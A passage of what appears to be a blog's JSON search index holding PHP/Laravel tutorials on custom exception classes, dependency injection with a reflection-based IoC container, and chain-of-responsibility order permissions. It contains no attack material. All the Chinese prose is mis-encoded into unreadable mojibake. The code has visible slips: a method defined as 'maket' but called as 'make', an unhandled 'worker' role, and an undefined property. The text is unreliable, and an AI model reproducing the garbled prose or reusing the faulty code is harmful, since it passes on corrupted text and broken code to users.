æ¯”å¦‚ç”¨æˆ·å¼‚å¸¸å¹¶ä¸æ˜¯å› ä¸ºç³»ç»Ÿæœ¬èº«çš„é—®é¢˜å¯¼è‡´çš„ï¼Œä¸ä¼šå½±å“ç³»ç»Ÿçš„è¿è¡Œï¼Œå¦‚æœå¤§é‡æ­¤ç±»æ—¥å¿—æ‰“å°åˆ°æ—¥å¿—æ–‡ä»¶é‡Œåè€Œä¼šå½±å“æˆ‘ä»¬å»åˆ†æçœŸæ­£æœ‰é—®é¢˜çš„å¼‚å¸¸ï¼Œå› æ­¤éœ€è¦å±è”½è¿™ä¸ªè¡Œä¸ºã€‚ åœ¨app/Exceptions/Handler.phpç±»ä¸­ï¼Œå°†éœ€è¦å±è”½çš„ç±»åŠ å…¥åˆ°dontReport å±æ€§ä¸­ï¼š 123protected $dontReport = [ InvalidRequestException::class, ]; ç³»ç»Ÿå†…éƒ¨å¼‚å¸¸æ¯”å¦‚è¿æ¥æ•°æ®åº“å¤±è´¥ï¼Œæˆ–è€…æŸSQL æ‰§è¡Œå¼‚å¸¸ï¼Œå¯¹äºæ­¤ç±»å¼‚å¸¸éœ€è¦æœ‰é™åº¦åœ°å‘ŠçŸ¥ç”¨æˆ·å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå› æ­¤ï¼Œå¯ä»¥ä¼ å…¥ä¸¤æ¡ä¿¡æ¯ï¼Œä¸€æ¡æ˜¯ç»™ç”¨æˆ·çœ‹çš„ï¼Œå¦ä¸€æ¡æ˜¯æ‰“å°åˆ°æ—¥å¿—ä¸­ç»™å¼€å‘äººå‘˜çœ‹çš„ã€‚ æ–°å»ºä¸€ä¸ª InternalException ç±»ï¼š 1$ php artisan make:exception InternalException app/Exceptions/InternalException.phpï¼š 1234567891011121314151617181920212223242526&lt;?phpnamespace App\\Exceptions;use Exception;use Illuminate\\Http\\Request;class InternalException extends Exception&#123; protected $msgForUser; public function __construct(string $message, string $msgForUser = 'ç³»ç»Ÿå†…éƒ¨é”™è¯¯', int $code = 500) &#123; parent::__construct($message, $code); $this-&gt;msgForUser = $msgForUser; &#125; public function render(Request $request) &#123; if ($request-&gt;expectsJson()) &#123; return response()-&gt;json(['msg' =&gt; $this-&gt;msgForUser], $this-&gt;code); &#125; return view('pages.error', ['msg' =&gt; $this-&gt;msgForUser]); &#125;&#125; åœ¨è¯¥ç±»ä¸­ï¼Œåªéœ€è¦ä¼ å…¥çœŸæ­£çš„å¼‚å¸¸ï¼Œè®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œè€Œæœ€ç»ˆè¿”å›ç»™ç”¨æˆ·çš„åªæœ‰ã€ç³»ç»Ÿå†…éƒ¨é”™è¯¯ã€è¿™äº›ä¿¡æ¯ã€‚ å®é™…åº”ç”¨å‡è®¾åœ¨æ§åˆ¶å™¨ä¸­ï¼Œéœ€è¦è°ƒç”¨ä¸€ä¸ªå°è£…å¥½çš„API ç±»ï¼Œåœ¨è¯¥ç±»ä¸­ï¼Œä½¿ç”¨\\Exception æŠ›å‡ºå¼‚å¸¸ï¼Œé‚£ä¹ˆåœ¨æ§åˆ¶å™¨ä¸­ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„InternalException ç±»è¿›è¡Œæ¥ç®¡å¼‚å¸¸ã€‚ 12345678910111213141516171819202122&lt;?phpnamespace App\\Http\\Controllers\\Api;use App\\Services\\Api\\UserApiService;class UsersController extends Controller&#123; // ... public function store(UserRequest $request) &#123; try &#123; // ... UserApiService::doSomething(); &#125; catch (\\Exception $exception) &#123; // æ¥ç®¡ \\Exception å¼‚å¸¸ // æŠ›å‡ºè‡ªå®šä¹‰å¼‚å¸¸ // $exception-&gt;getMessage() ä¸º UserApiService æŠ›å‡ºçš„å…·ä½“å¼‚å¸¸ä¿¡æ¯ throw new InternalException($exception-&gt;getMessage()); &#125; &#125;&#125; å®¢æˆ·ç«¯è§¦å‘å¼‚å¸¸ï¼š 1234&#123; \"code\": 500, \"msg\": \"ç³»ç»Ÿå†…éƒ¨å¼‚å¸¸\"&#125; å‚è€ƒé“¾æ¥ Laravel ä¼˜é›…åœ°å¤„ç†å¼‚å¸¸","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"ç”¨ä¸€ä¸ª IoC å®¹å™¨æ¥ç†è§£ä»€ä¹ˆæ˜¯ä¾èµ–æ³¨å…¥/æ§åˆ¶åè½¬","slug":"understand-dependency-injection-and-inversion-of-control","date":"2021-05-17T13:03:14.000Z","updated":"2021-05-18T13:49:13.121Z","comments":true,"path":"understand-dependency-injection-and-inversion-of-control/","link":"","permalink":"https://www.0x2beace.com/understand-dependency-injection-and-inversion-of-control/","excerpt":"ç»å¸¸ä¼šå¬åˆ°ã€ä¾èµ–æ³¨å…¥ã€(DependencyInjection)å’Œã€æ§åˆ¶åè½¬ã€(Inversion of Control)è¿™ä¸¤ä¸ªåè¯ï¼Œåˆå­¦è€…å¾€å¾€ä¼šè¢«å…¶ç»™å“ä½ï¼Œè¯¯ä»¥ä¸ºæ˜¯ä»€ä¹ˆç‰¹åˆ«é«˜æ·±çš„æŠ€æœ¯ï¼Œå…¶å®äº†è§£äº†æ¥é¾™å»è„‰ä¹‹åï¼Œå°±ä¼šå‘ç°ä»…ä»…åªæ˜¯åå­—å¬ä¸Šå»é«˜å¤§ä¸Šè€Œå·²ã€‚","text":"ç»å¸¸ä¼šå¬åˆ°ã€ä¾èµ–æ³¨å…¥ã€(DependencyInjection)å’Œã€æ§åˆ¶åè½¬ã€(Inversion of Control)è¿™ä¸¤ä¸ªåè¯ï¼Œåˆå­¦è€…å¾€å¾€ä¼šè¢«å…¶ç»™å“ä½ï¼Œè¯¯ä»¥ä¸ºæ˜¯ä»€ä¹ˆç‰¹åˆ«é«˜æ·±çš„æŠ€æœ¯ï¼Œå…¶å®äº†è§£äº†æ¥é¾™å»è„‰ä¹‹åï¼Œå°±ä¼šå‘ç°ä»…ä»…åªæ˜¯åå­—å¬ä¸Šå»é«˜å¤§ä¸Šè€Œå·²ã€‚ ä¾èµ–æ³¨å…¥ä¾èµ–å’Œæ³¨å…¥å…¶å®è¯´çš„æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œå®ƒä»¬åªæ˜¯ä¸€ç§ç¼–ç¨‹çš„æ€æƒ³ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯ç”¨äºå‡å°‘ç¨‹åºé—´çš„è€¦åˆã€‚ä»¥åŠæœ‰æ•ˆåˆ†ç¦»å¯¹è±¡å’Œå®ƒæ‰€éœ€çš„å¤–éƒ¨èµ„æºã€‚ ä¸‹é¢å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•çš„å°ä¾‹å­æ¥ä½“ä¼šä¸‹ä»€ä¹ˆæ˜¯ã€ä¾èµ–æ³¨å…¥ã€ï¼š car.php 12345678910&lt;?phpnamespace di;class Car&#123; public function pay() &#123; return \"199\"; &#125;&#125; person.php 1234567891011&lt;?phpnamespace di;class Person&#123; public function buy() &#123; $bwm = new Car(); return $bwm-&gt;pay(); &#125;&#125; index.php 1234&lt;?php$boo = new \\di\\Person();echo $boo-&gt;buy(); // 199 åœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼ˆä¸»è¦çœ‹Person è¿™ä¸ªç±»ï¼‰ï¼Œéœ€è¦æ˜ç¡®å‡ ä¸ªæ¦‚å¿µï¼š ä¾èµ–ï¼šè°ä¾èµ–äº†è°ï¼Ÿ æ³¨å…¥ï¼šè°åˆæ³¨å…¥äº†è°ï¼Ÿ é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼š Car ç±»åœ¨Person ç±»ä¸­å®ä¾‹åŒ–ï¼ˆPerson ç±»ã€ä¾èµ–ã€äºCar ç±»ï¼‰ ä½†æ­¤æ—¶å¹¶æ²¡æœ‰å‘ç°è°ã€æ³¨å…¥ã€è° è§‚å¯Ÿbuy() è¿™ä¸ªæ–¹æ³•ï¼Œå‡å¦‚éœ€æ±‚å‘ç”Ÿå˜åŒ–ï¼Œéœ€è¦ä¹°çš„ä¸æ˜¯ä¸€è¾†è½¦ï¼Œè€Œæ˜¯ä¸€æ ‹æˆ¿ï¼Œé‚£ä¹ˆè¿˜å¾—æ›´æ”¹ Person ç±»çš„æºç ï¼Œç”±å®ä¾‹åŒ–ä¸€è¾†è½¦æ”¹ä¸ºå®ä¾‹åŒ–ä¸€æ ‹æˆ¿ã€‚æ›´å¥½çš„åšæ³•åº”è¯¥æ˜¯ï¼ŒæŠŠæ‰€éœ€çš„å®ä¾‹ï¼Œé€šè¿‡å‡½æ•°å‚æ•°çš„æ–¹å¼ä¼ å…¥è¿›æ¥ã€‚ Person.php 12345678910&lt;?phpnamespace di;class Person&#123; public function buy($obj) &#123; return $obj-&gt;pay(); &#125;&#125; index.phpï¼š 12345&lt;?php$boo = new \\di\\Person();$car = new \\di\\Car();echo $boo-&gt;buy($car); // 199 ç°åœ¨å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ï¼ŒCarç±»é€šè¿‡å‡½æ•°å‚æ•°çš„æ–¹å¼ã€æ³¨å…¥ã€åˆ°äº†Person ç±»ä¸­ã€‚ ã€ä¾èµ–æ³¨å…¥ã€æœ‰å¤šç§ï¼Œè¿™é‡Œåªæ˜¯ç”¨ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­æ¥è§£é‡Šã€ä¾èµ–æ³¨å…¥ã€çš„æ€æƒ³ä»¥åŠå¯ä»¥æœ‰æ•ˆåœ°è§£å†³ä»€ä¹ˆé—®é¢˜ï¼š å‡å°‘ç¨‹åºé—´çš„è€¦åˆ åˆ†ç¦»å¯¹è±¡å’Œå®ƒæ‰€éœ€çš„å¤–éƒ¨èµ„æº æ§åˆ¶åè½¬é‚£ä¹ˆå•¥æ˜¯æ§åˆ¶åè½¬å‘¢ï¼Ÿ å†æ¬¡è§‚å¯Ÿæœ€å¼€å§‹çš„ä»£ç ï¼Œå¯ä»¥å‘ç°ï¼ŒCar ç±»åœ¨Person ç±»ä¸­æ˜¯è¢«åŠ¨å®ä¾‹åŒ–ï¼ŒPerson ç±»æ­£å‘æ§åˆ¶äº†Car ç±»ï¼Œå…¶å®ä¾‹åŒ–é¡ºåºæ˜¯å…ˆæœ‰äº†Person ç±»æ‰æœ‰Car ç±»ï¼šPerson -&gt; Carã€‚ æ”¹æˆåé¢çš„æ³¨å…¥æ–¹å¼ä¹‹åï¼Œåˆ™å¯ä»¥å‘ç°ï¼ŒCar ç±»æ˜¯ä¸»åŠ¨å®ä¾‹åŒ–ï¼ŒPerson ç±»å¤±å»äº†å¯¹Car ç±»çš„æ§åˆ¶æƒï¼Œå…¶å®ä¾‹åŒ–é¡ºåºæ˜¯å…ˆæœ‰Car ç±»æ‰æœ‰Person ç±»ï¼šCar -&gt; Personã€‚ è¿™å°±æ˜¯ã€æ§åˆ¶åè½¬ã€ã€‚ å…¶å®å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨ä¸ç»æ„é—´éƒ½æœ‰ä½¿ç”¨åˆ°è¿™ç§æ€æƒ³ï¼Œåªæ˜¯è‡ªå·±æ²¡æœ‰æ„è¯†åˆ°ã€‚ IoC å®¹å™¨Iocå®¹å™¨ï¼ˆInversion of Controlï¼‰å¸¸å¸¸ä¼´éšç€ä¾èµ–æ³¨å…¥ã€æ§åˆ¶åè½¬ä¸€èµ·å‡ºç°ï¼Œé‚£ä¹ˆå®ƒå€’åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ åœ¨å›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹ä¸Šé¢çš„é‚£æ®µä»£ç ï¼Œè™½ç„¶æœ€åä½¿ç”¨ä¾èµ–æ³¨å…¥çš„æ–¹å¼è§£è€¦äº†Personç±» å’ŒCar ç±»ï¼Œä½†æ­¤æ—¶åˆä¼šé¢ä¸´ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼šä¾èµ–ä»ç„¶éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œæ­¤æ—¶åªæœ‰ä¸¤ä¸ªç±»ç›¸äº’ä¾èµ–è¿˜å¥½ï¼Œä¸€æ—¦ç±»çš„ä¾èµ–å…³ç³»ï¼ŒåµŒå¥—è¿‡æ·±ï¼Œæ‰‹åŠ¨åˆ›å»ºå°±ä¼šå˜æˆä¸€ä»¶éº»çƒ¦äº‹ï¼š 12$boo = new \\di\\Person();echo $boo-&gt;buy(new \\di\\Car()); // 199 è¿™æ—¶å€™ï¼Œå°±éœ€è¦IoC å®¹å™¨ç™»åœºäº†ã€‚ IoC å®¹å™¨çš„æ ¸å¿ƒæ˜¯é€šè¿‡PHP çš„ åå°„ (Reflection) æ¥å®ç°çš„ã€‚ IoC.phpï¼š 1234567891011121314151617181920212223242526272829&lt;?phpnamespace di;class IoC&#123; public static function maket($className) &#123; $reflect = new \\ReflectionClass($className); $construct = $reflect-&gt;getConstructor(); if (!$construct) &#123; return new $className; &#125; $params = $construct-&gt;getParameters(); if (empty($params)) &#123; return new $className; &#125; $args = []; foreach ($params as $param) &#123; $class = $param-&gt;getClass(); if ($class) &#123; $args[] = static::make($class-&gt;name); &#125; &#125; return $reflect-&gt;newInstanceArgs($args); &#125;&#125; person.php 1234567891011121314151617181920&lt;?phpnamespace di;class person&#123; protected $obj; /** * éœ€è¦æ³¨æ„ï¼šè¦æƒ³åå°„èƒ½å¤Ÿè¯†åˆ«ï¼Œæ­¤å¤„å¿…é¡»ç»™å‚æ•°å£°æ˜ç±»å‹ã€‚ */ public function __construct(car $obj) &#123; $this-&gt;obj = $obj; &#125; public function buy() &#123; return $this-&gt;obj-&gt;pay(); &#125;&#125; index.php 123&lt;?php$boo = \\di\\IoC::make(\"\\di\\person\");echo $boo-&gt;buy(); // 199 å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿æ²¡æœ‰æ‰‹åŠ¨åˆ›å»ºCar ç±»ï¼Œä¹Ÿä¸ä¼šå½±å“Person ç±»çš„è°ƒç”¨ï¼Œè¿™å°±æ˜¯IoC å®¹å™¨æ‰€è§£å†³çš„é—®é¢˜ï¼šæŠŠå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´çš„ä¾èµ–å…³ç³»éšè—åˆ°å®¹å™¨ï¼ˆå­˜å‚¨å®ä¾‹åŒ–å¯¹è±¡ï¼‰ä¸­ï¼Œé€šè¿‡è‡ªåŠ¨åˆ›å»ºçš„æ–¹å¼è§£å†³ä¾èµ–å…³ç³»ã€‚ è¿™é‡Œä»…ä»…åªæ˜¯æŠ›ç –å¼•ç‰ï¼Œç”¨ä¸€ä¸ªç®€å•çš„IoC å®¹å™¨ä¾‹å­æ¥ç†è§£ä»€ä¹ˆæ˜¯ä¾èµ–æ³¨å…¥/æ§åˆ¶åè½¬ï¼Œæ›´å¤šç›¸å…³çŸ¥è¯†å¯ä»¥é€šè¿‡æŸ¥çœ‹ä¸»æµæ¡†æ¶æºç æˆ–è€…PHP-DI è¿›è¡Œå­¦ä¹ ã€‚ å‚è€ƒé“¾æ¥ å†™ä¸€ä¸ªç®€å•çš„IoCå®¹å™¨æ¡ˆä¾‹ï¼Œç†è§£ä»€ä¹ˆæ˜¯ä¾èµ–æ³¨å…¥å’Œæ§åˆ¶åè½¬","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"ä½¿ç”¨èŒè´£é“¾æ¨¡å¼å’Œåå°„è§£å†³æµæ°´çº¿é—®é¢˜","slug":"use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems","date":"2021-05-15T14:19:28.000Z","updated":"2021-05-15T14:29:49.138Z","comments":true,"path":"use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems/","link":"","permalink":"https://www.0x2beace.com/use-chain-of-responsibility-pattern-and-reflection-to-solve-pipeline-problems/","excerpt":"è®¾è®¡æ¨¡å¼æ˜¯åŒºåˆ†ç¨‹åºå‘˜èƒ½åŠ›å¤§å°çš„ä¸€ä¸ªé‡è¦å› ç´ â€”â€”Booã€‚","text":"è®¾è®¡æ¨¡å¼æ˜¯åŒºåˆ†ç¨‹åºå‘˜èƒ½åŠ›å¤§å°çš„ä¸€ä¸ªé‡è¦å› ç´ â€”â€”Booã€‚ éœ€æ±‚åˆ†æåŸæ¥çš„ä¸šåŠ¡å¯ä»¥çœ‹æˆæ˜¯ä¸€æ¡æµæ°´çº¿ï¼Œè¿™æ¡æµæ°´çº¿ä¸Šæœ‰å„ä¸ªæ¨¡å—æœ‰å„è‡ªçš„èŒè´£ï¼Œç›¸äº’ä¾èµ–ä½†å¹¶ä¸è€¦åˆï¼Œæ“ä½œA å®Œæˆä¹‹åï¼Œæ‰èƒ½æ‰§è¡Œæ“ä½œBï¼Œæ“ä½œå®Œæˆä¹‹åæ‰èƒ½æ‰§è¡Œæ“ä½œCâ€¦ ä»¥æ­¤ç±»æ¨ã€‚ å°±ç›®å‰çš„éœ€æ±‚æ¥çœ‹ï¼Œç›´æ¥ä½¿ç”¨ä¼ ç»Ÿçš„æ–¹å¼è¿›è¡Œç¼–ç ï¼Œå„ä¸ªèŒè´£æ‰€å¯¹åº”çš„åŠŸèƒ½ç›´æ¥å†™åˆ°æ§åˆ¶å™¨ä¸­ï¼Œå³å¯ã€‚ä½†é—®é¢˜åœ¨äºï¼ŒåŒæ—¶æœ‰å¤šä¸ªä¸åŒçš„è§’è‰²ï¼Œå¯èƒ½ä¼šè°ƒç”¨è¯¥åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š ç”¨æˆ·åªèƒ½æ‰§è¡ŒAã€C æ“ä½œï¼Œç®¡ç†å‘˜åªèƒ½æ‰§è¡ŒAã€Bã€C æ“ä½œï¼Œè€Œè¶…çº§ç®¡ç†å‘˜åˆ™å¯ä»¥æ‰§è¡Œæ‰€æœ‰æ“ä½œã€‚ å¦‚æœä»ç„¶åšæŒä½¿ç”¨ä¼ ç»Ÿçš„æ–¹å¼è¿›è¡Œç¼–ç ï¼Œé‚£ä¹ˆåŒä¸€ä¸ªæ“ä½œï¼Œå¯èƒ½éœ€è¦åœ¨ä¸åŒè§’è‰²æ¨¡å—ä¸‹å„è‡ªç»´æŠ¤ä¸€ä»½ï¼Œä¸€æ—¦å…¶ä¸­æŸä¸€ä¸ªçš„éœ€æ±‚å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆè¿˜å¾—åŒæ—¶æ›´æ­£å¥½å‡ ä»½ä»£ç â€¦ å·²çŸ¥éœ€æ±‚ï¼š æ¯ä¸ªè§’è‰²æ‰€éœ€è¦æ‰§è¡Œçš„æ“ä½œå†…å®¹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸ä¼šæ˜¯å› ä¸ºèº«ä»½æ˜¯ç®¡ç†å‘˜æˆ–è€…ç”¨æˆ·ï¼Œå…¶æ“ä½œå°±ä¼šå‘ç”Ÿå˜åŒ–ã€‚ æ‰€æœ‰çš„æ“ä½œåœ¨é€»è¾‘ä¸Šç›¸äº’ä¾èµ–ï¼Œä½†å¹¶ä¸è€¦åˆã€‚ æ¯ä¸ªè§’è‰²æ‰€èƒ½æ‰§è¡Œçš„æ“ä½œæ˜¯å·²çŸ¥çš„ã€‚ ç¦æ­¢è¶Šçº§æ“ä½œï¼Œä¸èƒ½ç›´æ¥è¶Šè¿‡A å»æ‰§è¡ŒB æ“ä½œã€‚ è´£ä»»é“¾æ¨¡å¼åŸºäºä»¥ä¸Šå‡ ç‚¹ï¼Œæœ€ç»ˆé€‰æ‹©ã€è´£ä»»é“¾æ¨¡å¼ã€ä½œä¸ºè®¾è®¡æ€è·¯ï¼ŒåŸå› æœ‰ä»¥ä¸‹ï¼š èŒè´£é“¾ä¸Šçš„å¤„ç†è€…è´Ÿè´£å¤„ç†è¯·æ±‚ï¼Œå®¢æˆ·åªéœ€è¦å°†è¯·æ±‚å‘é€åˆ°èŒè´£é“¾ä¸Šå³å¯ï¼Œæ— é¡»å…³å¿ƒè¯·æ±‚çš„å¤„ç†ç»†èŠ‚å’Œè¯·æ±‚çš„ä¼ é€’ï¼Œæ‰€ä»¥èŒè´£é“¾å°†è¯·æ±‚çš„å‘é€è€…å’Œè¯·æ±‚çš„å¤„ç†è€…è§£è€¦äº†ã€‚ åœ¨æ²¡è¾¾åˆ°æŒ‡å®šæ¡ä»¶å‰ï¼Œä¼šä¸€ç›´å‘ä¸‹ä¼ é€’ï¼Œç›´åˆ°ç»“æŸæµæ°´çº¿ å®ç°ä¼ªä»£ç åˆ†æè¿‡ç¨‹ï¼š æ–°å»ºä¸€ä¸ªè®¢å•æ“ä½œç±»ï¼Œåœ¨æ„é€ å‡½æ•°ä¸­åˆ†åˆ«æ¥æ”¶ç”¨æˆ·èº«ä»½å’Œè®¢å•IDï¼Œæ ¹æ®å½“å‰è®¢å•çŠ¶æ€åŠç”¨æˆ·èº«ä»½è·å–å„è‡ªå½“å‰æ‰€èƒ½æ‰§è¡Œçš„æ“ä½œï¼ˆè¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœè§’è‰²å¢åŠ ï¼Œæ„é€ å‡½æ•°ä¼šå› æ­¤å˜å¾—å¤æ‚ï¼Œå¯ä»¥é…åˆä½¿ç”¨å…¶ä»–è®¾è®¡æ¨¡å¼ä»£æ›¿åœ¨æ„é€ å‡½æ•°ä¸­èµ‹å€¼ï¼‰ã€‚ åœ¨è¯¥ç±»ä¸­é…åˆPHPStorm æ³¨è§£å®šä¹‰æ‰€æœ‰éœ€è¦æ‰§è¡Œçš„æ“ä½œ é€šè¿‡é­”æœ¯æ–¹å¼__call è¿›è¡Œåå°„ï¼Œå°†æ“ä½œæ˜ å°„åˆ°å…·ä½“åŠŸèƒ½å®ç°çš„ç±»ä¸­ æ ¸å¿ƒæœ‰ä¸¤ç‚¹ï¼š é€šè¿‡èŒè´£è¿è·å–ä¸åŒè§’è‰²æ‰€èƒ½æ‰§è¡Œçš„æ“ä½œ PHPStorm æ³¨è§£é…åˆåå°„ä½¿ç”¨ï¼ŒæŸ¥æ‰¾å¹¶æ‰§è¡Œå…·ä½“åŠŸèƒ½ æ­¥éª¤ä¸€åˆ›å»ºèŒè´£è¿ï¼š ç”¨æˆ·ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php namespace App\\Services\\order\\action;class UserOrderActionService&#123; private $order; public function __construct($order) &#123; $this-&gt;order = $order; &#125; static public function getAction($order) &#123; return (new self($order))-&gt;step1(); &#125; private function step1() &#123; if ($this-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123; return [ 'actionA', ]; &#125; return $this-&gt;step2(); &#125; private function step2() &#123; if ($this-&gt;order-&gt;order_type == OrderType::FAIL) &#123; return [ 'actionD', ]; &#125; return $this-&gt;step3(); &#125; //... private function stepEnd() &#123; return []; &#125;&#125; ç®¡ç†å‘˜ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php namespace App\\Services\\order\\action;class AdminOrderActionService&#123; private $order; public function __construct($order) &#123; $this-&gt;order = $order; &#125; static public function getAction($order) &#123; return (new self($order))-&gt;step1(); &#125; private function step1() &#123; if ($this-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123; return [ 'actionA', 'actionB', 'actionC', ]; &#125; return $this-&gt;step2(); &#125; private function step2() &#123; if ($this-&gt;order-&gt;order_type == OrderType::FAIL) &#123; return [ 'actionD', ]; &#125; return $this-&gt;step3(); &#125; //... private function stepEnd() &#123; return []; &#125;&#125; è¶…çº§ç®¡ç†å‘˜ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace App\\Services\\order\\action;class SuperAdminOrderActionService&#123; private $order; public function __construct($order) &#123; $this-&gt;order = $order; &#125; static public function getAction($order) &#123; return (new self($order))-&gt;step1(); &#125; private function step1() &#123; if ($this-&gt;order-&gt;order_type == OrderType::SUCCESS) &#123; return [ 'actionA', 'actionB', 'actionC', ]; &#125; return $this-&gt;step2(); &#125; private function step2() &#123; if ($this-&gt;order-&gt;order_type == OrderType::FAIL) &#123; return [ 'actionC', ]; &#125; return $this-&gt;step3(); &#125; //... private function stepEnd() &#123; return []; &#125;&#125; æ­¥éª¤äºŒè™½ç„¶ä¸åŒçš„æ“ä½œæ“ä½œä¹‹é—´å¹¶æ²¡æœ‰ç›´æ¥å…³è”ï¼Œæ­¤å¤„ä¸ºäº†æ–¹ä¾¿æ—¥ååŠŸèƒ½æ‰©å±•ï¼Œè¿˜æ˜¯å°†ä¸åŒç±»å‹çš„æ“ä½œè¿›è¡Œäº†åˆ†ç±» OrderSuccessServiceï¼š 123456789101112131415161718192021222324252627&lt;?phpnamespace App\\Services\\order;class OrderSuccessService &#123; // ... public function actionA(array $param)&#123; try&#123; // å…·ä½“ä¸šåŠ¡é€»è¾‘ &#125;catch(OrderException $exception)&#123; throw new \\Exception($exception-&gt;getMessage()); &#125; &#125; public function actionB(array $param)&#123; // ... &#125; public function actionC(array $param)&#123; // ... &#125; // ...&#125; OrderFailServiceï¼š 12345678910111213141516171819&lt;?phpnamespace App\\Services\\order;class OrderFailService &#123; // ... public function actionD(array $param)&#123; try&#123; // å…·ä½“ä¸šåŠ¡é€»è¾‘ &#125;catch(OrderException $exception)&#123; throw new \\Exception($exception-&gt;getMessage()); &#125; &#125; // ... &#125; æ­¥éª¤äºŒåˆ›å»ºOrderAction ç±»ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phpnamespace App\\Services\\order\\action;use App\\Models\\OrderModel;use App\\Services\\order\\action\\UserOrderActionService;use App\\Services\\order\\action\\AdminOrderActionService;use App\\Services\\order\\action\\SuperAdminOrderActionService;/** * æ³¨è§£éƒ¨åˆ† * @method OrderSuccessService actionA() æ“ä½œA * @method OrderSuccessService actionB() æ“ä½œB * @method OrderSuccessService actionC() æ“ä½œC * @method OrderFailService actionD() æ“ä½œD * // ... * Class OrderAction * @package App\\Services\\order\\action */class OrderAction&#123; private $actionCode; private $class = [ \"App\\Services\\order\\OrderSuccessService\", \"App\\Services\\order\\OrderFailService\", // ... ]; public function __construct(string $role_type, int $order_id) &#123; $order = OrderModel::find($order_id); switch ($role_type) &#123; case \"user\": $this-&gt;actionCode = UserOrderActionService::getAction($order); break; case \"admin\": $this-&gt;actionCode = AdminOrderActionService::getAction($order); break; case \"superAdmin\": $this-&gt;actionCode = superAdminOrderActionService::getAction($order); break; default : // ... &#125; &#125; private function strategy($name) &#123; foreach ($this-&gt;class as $class) &#123; if (in_array($name, get_class_methods($class))) &#123; return new $class($this-&gt;actionUser); &#125; &#125; return $this; &#125; private function auth(string $method) &#123; if (!in_array($method, $this-&gt;actionCode)) &#123; throw new \\Exception(\"éæ³•æ“ä½œï¼Œç¦æ­¢è¶Šçº§æ“ä½œ\"); &#125; return $this; &#125; public function __call($name, $arguments) &#123; return $this-&gt;auth($name)-&gt;strategy($name)-&gt;$name(...$arguments); &#125;&#125; æ­¥éª¤å››æ§åˆ¶å™¨è°ƒç”¨ï¼š 1234567891011121314151617namespace App\\Services\\user;class OrderController&#123; public function actionA(OrderRequest $request) &#123; $param = $request-&gt;only(['order_id']); try &#123; (new OrderAction(\"worker\", $param['order_id']))-&gt;actionA($param); &#125; catch (OrderException $exception) &#123; return $this-&gt;failed($exception-&gt;getMessage()); &#125; return $this-&gt;success(); &#125;&#125; è‡³æ­¤ï¼Œè¯¥ä¸šåŠ¡çš„æ ¸å¿ƒæµç¨‹å·²ç»é€šè¿‡èŒè´£è¿æ¨¡å¼å’Œåå°„å®ç°ã€‚ å›å¤´å†çœ‹çœ‹è¿™äº›ä»£ç ï¼Œå…¶å®ä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆéš¾åº¦ï¼Œåªæ˜¯è‡ªå·±åœ¨è¿™æ–¹ä¾¿çš„é”»ç‚¼å¤ªå°‘äº†ï¼Œæ¯æ¯é‡åˆ°é—®é¢˜ï¼Œæ€»æ˜¯å¾ˆéš¾å°†éœ€æ±‚æŠ½è±¡ï¼Œæˆ–è€…å°½ç®¡çŸ¥é“ç”¨ä»€ä¹ˆè®¾è®¡æ¨¡å¼ï¼Œä½†æœ€ç»ˆå¯¼è‡´å†™ä¸å‡ºæ¥ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"PHP/Laravel/è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"å°ç¨‹åºå¼€å‘ç»éªŒæ€»ç»“","slug":"summary-of-mini-program-development-experience","date":"